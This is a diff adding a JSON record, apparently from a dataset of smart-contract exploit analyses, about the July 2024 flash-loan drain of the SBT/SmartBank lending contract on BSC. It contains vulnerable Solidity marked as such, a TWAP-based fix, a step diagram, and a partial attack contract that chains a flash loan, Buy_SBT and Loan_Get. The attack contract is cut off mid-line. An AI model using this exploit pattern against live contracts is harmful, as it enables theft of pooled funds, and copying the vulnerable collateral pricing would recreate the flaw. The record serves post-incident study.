@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-07-25_SBT_FlashLoanLoanDrain",
+ "source_file": "2024/2024-07-25_SBT_FlashLoanLoanDrain.md",
+ "title": "SBT (SmartBank) — Flash Loan and Buy/Loan Mechanism Exploit Analysis",
+ "date": "2024-07-25",
+ "protocol": "SBT / SmartBank",
+ "chain": "BSC",
+ "loss_raw": "~56,000 BUSD",
+ "loss_usd": null,
+ "root_cause": "`Loan_Get()` references a spot price manipulable via `Buy_SBT()` when calculating collateral value — allows excessive USDT borrowing after SBT price manipulation",
+ "attack_tx": "0x9a8c...e0d (block 40,378,160)",
+ "vulnerable_contract": "SmartBank (Bank contract)",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: Buy_SBT mints SBT at the current pool price\nfunction Buy_SBT(uint256 busdAmount) external {\n    IERC20(BUSD).transferFrom(msg.sender, address(this), busdAmount);\n    //",
+  "❌ SBT minted immediately based on current BUSD deposit amount (price manipulable)\n    uint256 sbtAmount = busdAmount * SBT_PER_BUSD;\n    IERC20(SBT).mint(msg.sender, sbtAmount);\n}\n\nfunction Loan_Get(uint256 usdtAmount) external {\n    uint256 sbtBalance = IERC20(SBT).balanceOf(msg.sender);\n    //",
+  "❌ Borrow limit determined solely by SBT balance — balance manipulated via flash loan\n    require(sbtBalance * USDT_PER_SBT >= usdtAmount, \"Insufficient collateral\");\n    IERC20(USDT).transfer(msg.sender, usdtAmount);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: Apply TWAP-based SBT valuation to borrow limit\nfunction Loan_Get(uint256 usdtAmount) external {\n    uint256 sbtBalance = IERC20(SBT).balanceOf(msg.sender);\n    uint256 sbtPrice = ITwapOracle(ORACLE).getPrice(SBT);  //",
+  "✅ TWAP price\n    require(sbtBalance * sbtPrice >= usdtAmount * 1e18, \"Insufficient collateral\");\n    IERC20(USDT).transfer(msg.sender, usdtAmount);\n}"
+ ],
+ "steps": [
+  "[2] ► Transfer 950,000 BUSD → Bank contract",
+  "[4] ► Bank.Buy_SBT() → acquire 20,000,000 SBT"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Uniswap V3 Flash Loan: borrow 1,950,000 BUSD\n  │\n  ├─[2]─► Transfer 950,000 BUSD → Bank contract\n  │\n  ├─[3]─► Call Bank._Start() (initialization)\n  │\n  ├─[4]─► Bank.Buy_SBT() → acquire 20,000,000 SBT\n  │\n  ├─[5]─► Call Bank.Loan_Get(1,966,930 USDT)\n  │         └─► Borrow USDT using SBT as collateral\n  │\n  ├─[6]─► Repay flash loan (BUSD + fee)\n  │\n  └─[7]─► Total loss: ~56,000 BUSD (USDT proceeds minus flash loan cost)",
+  "contract AttackContract {\n    address constant POOL = /* Uniswap V3 BUSD/USDC Pool */;\n\n    function testExploit() external {\n        // [1] Uniswap V3 flash loan for 1.95M BUSD\n        IUniswapV3Pool(POOL).flash(address(this), 1_950_000e18, 0, \"\");\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) external {\n        // [2] Transfer 950K BUSD to Bank\n        IERC20(BUSD).transfer(BANK, 950_000e18);\n\n        // [3] Initialize Bank\n        IBank(BANK)._Start();\n\n        // [4] Buy SBT with remaining BUSD\n        IERC20(BUSD).approve(BANK, type(uint256).max);\n        IBank(BANK).Buy_SBT(IERC20(BUSD).balanceOf(address(this)));\n\n        // [5] Borrow USDT using SBT as collateral\n        IBank(BANK).Loan_Get(1_966_930e18);\n\n        // [6] Repay flash loan\n        IE"
+ ]
+}
